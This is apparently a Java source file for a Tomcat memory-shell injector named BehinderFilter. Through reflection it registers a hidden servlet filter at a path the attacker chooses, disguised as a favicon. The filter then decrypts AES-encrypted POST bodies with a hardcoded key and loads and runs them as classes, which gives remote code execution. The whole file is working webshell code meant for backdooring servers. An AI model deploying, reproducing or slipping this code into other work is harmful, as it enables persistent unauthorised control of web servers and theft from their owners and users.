package com.sorry.bug.tomcat;


import org.apache.catalina.Context;
import org.apache.catalina.core.*;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.HashMap;

/**
 * created by 0x22cb7139 on 2021/7/12
 */
public class BehinderFilter extends ClassLoader implements Filter  {

    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String Pwd = "eac9fa38330a7535";
    public String path = "/favicondemo.ico";
    public String filterName = "favicondemo";


    public BehinderFilter(){}
    public BehinderFilter(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
        } catch (Exception var3) {
        }

        return ret;
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = md5(this.request.getHeader("p"));
        this.path = this.request.getHeader("path");
        this.filterName = this.path.substring(1);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }


    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }


    public String addFilter()  {
        try {
            final ServletContext servletContext = this.request.getSession().getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext =(ApplicationContext) appctx.get(servletContext);
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
            Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
            configs.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) configs.get(standardContext);
            if(map.get(filterName)==null){
                this.transform(map,standardContext, this.path);
            }
            return "Success";
        } catch (Exception e) {
            System.out.println("Injected");
            return e.getMessage();
        }
    }

    public void transform(HashMap map,Object standardContext,String path) throws Exception{
        System.out.println("add filter");
        Class filterDefClass = null;
        try{
            //tomcat7
            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
        }catch (ClassNotFoundException e){
            //tomcat8/9
            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        }
        Object filterDef = filterDefClass.newInstance();
        filterDef.getClass().getDeclaredMethod("setFilterName",new Class[]{String.class}).invoke(filterDef,new Object[]{filterName});
        Filter filter = new BehinderFilter();
        filterDef.getClass().getDeclaredMethod("setFilterClass",new Class[]{String.class}).invoke(filterDef,new Object[]{filter.getClass().getName()});
        filterDef.getClass().getDeclaredMethod("setFilter",new Class[]{Filter.class}).invoke(filterDef,new Object[]{filter});
        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext,new Object[]{filterDef});
        Class filterMapClass = null;
        try{
            //tomcat7
            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
        }catch (ClassNotFoundException e){
            //tomcat8/9
            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        }
        Object filterMap = filterMapClass.newInstance();
        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{path});
        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

        //设置 FilterConfig
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
        map.put(filterName, filterConfig);
        System.out.println("Inject Successful");
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse rsp = (HttpServletResponse) servletResponse;
        rsp.setHeader("X-Geo-Country","*");
        try {
            if (req.getMethod().equals("POST")) {
                String k = Pwd;
                req.getSession().setAttribute("u", k);
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                pageContext.put("session", req.getSession());
                pageContext.put("request", req);
                pageContext.put("response", rsp);
                java.io.BufferedReader bf = req.getReader();
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                String sb = new String(evilClassBytes);
                Method defineclass= ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE,Integer.TYPE);
                defineclass.setAccessible(true);
                Class clazz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),evilClassBytes,0,evilClassBytes.length);
                Object a = clazz.newInstance();
                a.equals(pageContext);
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
